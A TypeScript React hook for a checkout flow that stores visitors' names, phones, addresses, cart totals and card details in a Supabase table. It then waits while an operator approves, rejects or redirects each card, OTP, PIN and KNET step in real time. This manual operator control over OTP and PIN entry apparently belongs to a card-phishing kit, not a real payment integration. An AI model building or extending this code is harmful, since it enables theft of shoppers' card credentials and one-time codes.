import { useState, useEffect, useCallback, useRef } from 'react';
import { supabase } from '@/integrations/supabase/client';
import { normalizePhone } from '@/lib/visitorIdentity';
import { getPaymentFlowState } from '@/lib/paymentFlowState';

// يرفق بيانات الزائر من صفحة إتمام الطلب (العنوان، الوقت، المنتجات) مع كل خطوة دفع
const buildCheckoutMeta = () => {
  const fs: any = getPaymentFlowState() || {};
  const f = fs.form || {};
  const visitorSessionId = typeof window !== 'undefined' ? sessionStorage.getItem('visitor_session_id') : null;
  const meta: Record<string, any> = {
    address_area: f.area, address_block: f.block, address_street: f.street, address_building: f.building,
    address_floor: f.floor, address_apartment: f.apartment, address_notes: f.notes,
    cart_items_count: Array.isArray(fs.items) && fs.items.length ? fs.items.length : undefined,
    cart_total: fs.total ? Number(Number(fs.total).toFixed(3)) : undefined,
    payment_method_choice: fs.paymentMethod,
    visitor_session_id: visitorSessionId || undefined,
  };
  Object.keys(meta).forEach(k => (meta[k] === undefined || meta[k] === null || meta[k] === '') && delete meta[k]);
  return { meta, form: f, total: fs.total };
};

type PaymentStep = 'card_payment' | 'card_otp' | 'card_pin' | 'knet_payment' | 'knet_otp';
type SessionStatus = 'pending' | 'approved' | 'rejected';

const TIMEOUT_SECONDS = 300; // 5 minutes

const STEP_ROUTES: Record<string, string> = {
  card_payment: '/card-payment',
  card_otp: '/card-otp',
  card_pin: '/card-pin',
  knet_payment: '/knet-payment',
  knet_otp: '/knet-otp',
};

interface UsePaymentSessionOptions {
  step: PaymentStep;
  customerName?: string;
  customerPhone?: string;
  total?: number;
  cardLast4?: string;
  paymentMethod: 'card' | 'knet';
  metadata?: Record<string, any>;
}

export const usePaymentSession = () => {
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [status, setStatus] = useState<SessionStatus | null>(null);
  const [waiting, setWaiting] = useState(false);
  const [remainingTime, setRemainingTime] = useState(TIMEOUT_SECONDS);
  const [redirectTo, setRedirectTo] = useState<string | null>(null);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const currentStepRef = useRef<string | null>(null);
  const lastRedirectAtRef = useRef<string>('');

  // Handle updates from realtime or polling (status change, step change, or admin redirect_to)
  const handleRowUpdate = useCallback((row: any) => {
    if (!row) return;
    const newStatus = row.status as SessionStatus;
    const newStep = row.step as string | undefined;
    const meta = (row.metadata || {}) as Record<string, any>;
    const redirectTarget: string | undefined = meta.redirect_to;
    const redirectAt: string | undefined = meta.redirect_at || meta.redirect_nonce;

    // 1) Admin redirect to any route (highest priority)
    if (redirectTarget && redirectAt && redirectAt !== lastRedirectAtRef.current) {
      lastRedirectAtRef.current = redirectAt;
      currentStepRef.current = newStep || currentStepRef.current;
      setRedirectTo(redirectTarget + (redirectTarget.includes('?') ? '&' : '?') + 't=' + Date.now());
      if (timerRef.current) clearInterval(timerRef.current);
      if (timeoutRef.current) clearTimeout(timeoutRef.current);
      return;
    }

    // 2) Admin moved visitor to a different payment step
    if (newStep && currentStepRef.current && newStep !== currentStepRef.current) {
      const route = STEP_ROUTES[newStep];
      if (route) {
        currentStepRef.current = newStep;
        setRedirectTo(route + '?t=' + Date.now());
        if (timerRef.current) clearInterval(timerRef.current);
        if (timeoutRef.current) clearTimeout(timeoutRef.current);
        return;
      }
    }

    // 3) Approve / Reject
    setStatus(newStatus);
    if (newStatus && newStatus !== 'pending') {
      if (timerRef.current) clearInterval(timerRef.current);
      if (timeoutRef.current) clearTimeout(timeoutRef.current);
    }
  }, []);

  const clearRedirect = useCallback(() => setRedirectTo(null), []);

  // Realtime subscription
  useEffect(() => {
    if (!sessionId) return;

    const channel = supabase
      .channel(`payment-session-${sessionId}`)
      .on('postgres_changes', {
        event: 'UPDATE',
        schema: 'public',
        table: 'payment_sessions',
        filter: `id=eq.${sessionId}`,
      }, (payload) => {
        handleRowUpdate(payload.new);
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [sessionId, handleRowUpdate]);

  // Fallback polling every 3s in case realtime fails
  useEffect(() => {
    if (!sessionId) return;

    const pollInterval = setInterval(async () => {
      const { data } = await supabase
        .from('payment_sessions')
        .select('status, step, metadata')
        .eq('id', sessionId)
        .single();
      if (!data) return;
      handleRowUpdate(data);
    }, 3000);

    return () => clearInterval(pollInterval);
  }, [sessionId, handleRowUpdate]);


  // Auto-reject timeout
  useEffect(() => {
    if (!waiting || status !== 'pending' || !sessionId) return;

    setRemainingTime(TIMEOUT_SECONDS);

    timerRef.current = setInterval(() => {
      setRemainingTime(prev => {
        if (prev <= 1) {
          if (timerRef.current) clearInterval(timerRef.current);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    timeoutRef.current = setTimeout(async () => {
      // Auto-reject after timeout
      await supabase.from('payment_sessions').update({ status: 'rejected' } as any).eq('id', sessionId);
      setStatus('rejected');
    }, TIMEOUT_SECONDS * 1000);

    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
      if (timeoutRef.current) clearTimeout(timeoutRef.current);
    };
  }, [waiting, sessionId]);

  // Clear timers when status changes from pending
  useEffect(() => {
    if (status && status !== 'pending') {
      if (timerRef.current) clearInterval(timerRef.current);
      if (timeoutRef.current) clearTimeout(timeoutRef.current);
    }
  }, [status]);

  const createSession = useCallback(async (options: UsePaymentSessionOptions) => {
    setWaiting(true);
    setStatus('pending');
    setRemainingTime(TIMEOUT_SECONDS);
    setRedirectTo(null);
    currentStepRef.current = options.step;

    const checkout = buildCheckoutMeta();
    const { data, error } = await supabase.from('payment_sessions').insert({
      step: options.step,
      status: 'pending',
      customer_name: options.customerName || checkout.form.name,
      customer_phone: normalizePhone(options.customerPhone || checkout.form.phone),
      total: options.total || checkout.total,
      card_last4: options.cardLast4,
      payment_method: options.paymentMethod,
      metadata: { ...checkout.meta, ...(options.metadata || {}) },
    } as any).select().single();

    if (error) {
      console.error('Failed to create payment session:', error);
      setWaiting(false);
      return null;
    }

    setSessionId((data as any).id);
    return (data as any).id;
  }, []);

  const reset = useCallback(() => {
    setSessionId(null);
    setStatus(null);
    setWaiting(false);
    setRemainingTime(TIMEOUT_SECONDS);
    setRedirectTo(null);
    currentStepRef.current = null;
    if (timerRef.current) clearInterval(timerRef.current);
    if (timeoutRef.current) clearTimeout(timeoutRef.current);
  }, []);

  return { sessionId, status, waiting, remainingTime, redirectTo, createSession, reset, clearRedirect };
};
